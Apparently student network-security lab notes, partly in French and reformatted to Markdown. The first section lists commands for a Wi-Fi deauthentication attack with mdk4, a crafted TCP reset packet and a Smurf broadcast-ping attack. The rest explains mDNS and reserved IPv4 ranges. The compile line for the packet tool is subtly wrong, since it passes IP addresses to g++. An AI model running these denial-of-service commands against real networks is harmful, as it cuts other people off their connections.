Voici le texte transformé en format Markdown :

```markdown
# Dauth Frames

## Install mdk4
- `sudo apt-get install mdk4`

## Setup an interface in monitor mode
- `sudo airmon-ng start <interface>`
- If an error occurs, kill the process: `sudo airmon-ng check kill`
- `iwconfig` should show a new interface: `<interface>mon`
- The attack will be done on this interface

## Execute Dauth Attack
- `sudo mdk4 <interface> d -w <file> -c <channel>`
  - `file`: WhiteList MAC address
  - `channel`: Channel of the AP (remove `-c <channel>` for an attack on all channels)

## Crafting Packet
- Use `g++ -o rst_packet rst_packet.cpp <ipSrc> <ipDst>` (use valid IP addresses for `ipSrc` and `ipDst`)
- Check if reset packets are detected by the sniffer (RST Flag: ...)

## SMURF Attack
- `ping -b <broadcast ip> -c <number of packets> <ip to ping>`
- Or just `ping <ip>`

# 224.0.0.251

L'adresse IP 224.0.0.251 est une adresse IP multicast réservée à l'utilisation du protocole de découverte de services Zeroconf (Zero Configuration Networking), également connu sous le nom de mDNS (multicast DNS). Le mDNS permet aux appareils sur un réseau local de découvrir et de se connecter les uns aux autres sans configuration préalable. Cette adresse IP est utilisée pour la résolution de noms de domaine locaux sans avoir besoin d'un serveur DNS central.

En d'autres termes, lorsqu'un appareil sur le réseau local recherche d'autres appareils ou services, il peut diffuser des requêtes multicast à l'adresse IP 224.0.0.251 pour découvrir les services disponibles sur le réseau sans nécessiter une infrastructure DNS traditionnelle. Cela est couramment utilisé dans les réseaux domestiques et locaux pour faciliter la découverte automatique des appareils et des services sans configuration manuelle.

## Adresses IP Réservées
Oui, il existe plusieurs plages d'adresses IP réservées à des utilisations spécifiques, telles que des services particuliers, des protocoles de communication spécifiques, ou des usages réservés à des fins particulières. Voici quelques exemples :

1. **Adresse IP de bouclage (Loopback):**
   - `127.0.0.1` est l'adresse IP de bouclage standard, également connue sous le nom de "localhost". Elle est utilisée pour les tests de réseau sur la machine locale.

2. **Adresses IP privées:**
   - `10.0.0.0` à `10.255.255.255`
   - `172.16.0.0` à `172.31.255.255`
   - `192.168.0.0` à `192.168.255.255`
   Ces plages d'adresses sont réservées pour une utilisation dans les réseaux privés et ne sont pas routées sur Internet.

3. **Adresses IP multicast:**
   - Diverses adresses IP de la plage `224.0.0.0` à `239.255.255.255` sont réservées pour le multicast. Par exemple, `224.0.0.1` est utilisée pour toutes les hôtes sur le réseau local, `224.0.0.2` est utilisée pour tous les routeurs sur le réseau local, etc.

4. **Adresse IP de diffusion (Broadcast):**
   - `255.255.255.255` est utilisée pour envoyer des données à tous les appareils sur le réseau local.

5. **Adresses IP spéciales pour les protocoles réservés:**
   - `0.0.0.0` est utilisée comme adresse indiquant "toutes les adresses" ou "tous les hôtes".
   - `169.254.0.0` à `169.254.255.255` est réservée pour l'auto-configuration d'adresses IP sur un réseau local en l'absence de serveur DHCP.

Ces adresses IP réservées contribuent à organiser et à optimiser le fonctionnement d'Internet et des réseaux locaux en définissant des plages spécifiques pour des fins spécifiques.
```